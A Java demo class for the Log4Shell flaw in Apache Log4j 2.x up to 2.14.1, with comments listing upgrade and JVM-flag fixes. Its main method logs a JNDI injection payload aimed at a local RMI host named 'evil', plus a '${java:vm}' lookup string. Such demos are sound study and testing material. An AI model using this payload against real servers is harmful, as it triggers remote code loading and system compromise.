package com.rechaox.colab.cve;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 影响范围： Apache Log4j 2.x <= 2.14.1
 *
 * 修复：
 *  1、升级到 2.15+
 *  2、jvm启动参数添加：-Dlog4j2.formatMsgNoLookups=true
 *
 * @author Bing D. Yee
 * @since 2021/12/11
 */
public class Log4jCVE_1 {

    static Logger LOGGER = LogManager.getLogger();


    public static void main(String[] args) {
        String name = "${jndi:rmi://127.0.0.1:1099/evil}";
        String jvm = "${java:vm}";
        LOGGER.error("info, {}", name);
    }

}
